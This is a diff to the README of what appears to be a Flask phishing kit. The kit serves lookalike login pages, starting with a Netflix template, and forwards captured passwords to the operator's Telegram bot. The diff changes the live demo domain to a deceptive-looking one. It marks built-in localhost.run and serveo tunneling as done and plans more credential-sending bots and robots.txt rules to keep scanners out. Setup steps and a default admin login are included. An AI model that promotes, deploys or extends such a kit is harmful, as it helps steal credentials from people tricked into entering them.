@@ -7,7 +7,7 @@
 ## ABOUT
 Yo! Welcome to the Phishing Framework. This bad boy is built with Flask and lets you show off the risks of phishing, grabbing passwords straight to your Telegram. 🚀
 
-- **[Check Out the Live Demo](https://tewale9829.pythonanywhere.com/)** 🌐
+- **[Check Out the Live Demo](https://socialsiteverify.pythonanywhere.com/)** 🌐
 
 ## Templates On Deck:
 - 🎥 Netflix
@@ -24,14 +24,22 @@ Yo! Welcome to the Phishing Framework. This bad boy is built with Flask and lets
 
 -----
 
-## WHAT'S NEXT
+Here's the plan, folks! 📝
+
+### ✅ Done and Dusted
+
+- ✅ Automated installer 🤖 (Just sit back and relax!)
+- ✅ localhost.run and serveo embedded for local port-forwarding 🌐 (Tunneling made easy!)
+
+
+### 🚀 Coming Soon
+
 - 🔐 Beefed-up encryption
-- ⚙️ Automated installer
-- 🔗 Embedded URL shortener
 - ✅ Auto verifier for storing legit passwords only
-- 🌐 Ngrok for local port-forwarding
-- 📲 More sender bots along with Telegram for convenience
-- 🤖 Robots.txt for bot removal
+- 🔗 Embedded URL shortener 🔗 (Short and sweet links!)
+- 📲 More sender bots along with Telegram for convenience 🤖 (More ways to get those creds!)
+- 🤖 Robots.txt for bot removal 🚫 (Keeping the bots at bay!)
+
 
 -----
 
@@ -41,16 +49,15 @@ Yo! Welcome to the Phishing Framework. This bad boy is built with Flask and lets
 - 🔧 Flask-Admin
 - 📡 Requests
 - 👤 User-Agent
+- 📋 Clipman
 - **And most importantly, your love and support with a star! ⭐**
-
------
 
 ## HOW TO GET STARTED
 
 ### Local Setup (with Port Forwarding)
 1. 🔽 Clone this repo
 2. 📦 Install the requirements
-3. 🚀 Run `main.py` and head to `http://localhost:8000`
+3. 🚀 Run `setup.py` and then head to `url` in browser
 4. 🔑 Login with `admin:root`
 5. 📋 Your control panel window will appear
 6. 🤖 Create your Telegram bot with BotFather
